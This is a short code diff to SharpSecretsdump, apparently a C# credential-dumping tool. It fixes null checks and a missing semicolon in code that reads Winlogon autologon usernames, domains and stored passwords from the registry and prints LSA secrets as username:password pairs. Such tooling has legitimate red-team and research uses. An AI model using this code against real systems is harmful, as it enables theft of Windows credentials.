@@ -250,21 +250,22 @@ namespace SharpSecretsdump
                                         string username = Encoding.ASCII.GetString(GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultUserName"));
                                         string domain = Encoding.ASCII.GetString(GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultDomainName"));
                                         string password = Encoding.ASCII.GetString(GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultPassword"));
-                                        if (username)
+                                        if (username != null)
                                         {
                                             username = username.Remove(username.Length - 1);
                                         }
                                         else
                                         {
-                                            username = "(Unkown User)"
+                                            username = "(Unkown User)";
                                         }
-                                        if (domain)
+                                        if (domain != null)
                                         {
                                             domain = domain.Remove(domain.Length - 1);
                                             username = $"{domain}\\{username}";
                                         }
                                         Console.WriteLine($"{secret}: {username}:{Encoding.Unicode.GetString(secretBlob.secret)}");
-                                        if (password)
+                                        // For some reason password can be also defined in Winlogon
+                                        if (password != null)
                                         {
                                             Console.WriteLine($"{secret}: {username}:{password}");
                                         }
